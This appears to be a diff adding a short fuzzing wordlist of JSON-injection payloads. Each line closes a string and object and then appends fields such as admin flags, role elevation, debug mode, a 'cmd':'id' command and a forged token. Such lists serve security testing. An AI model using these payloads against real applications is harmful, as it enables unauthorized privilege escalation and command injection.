@@ -1,0 +1,10 @@
+"}"
+"},"admin":true
+"},"role":"admin"
+"},"isAdmin":true
+"},"debug":true
+"},"cmd":"id"
+"},"token":"hacked"
+"},"config":{"debug":true}
+"},"permissions":["admin"]
+"},"user":{"role":"admin"}
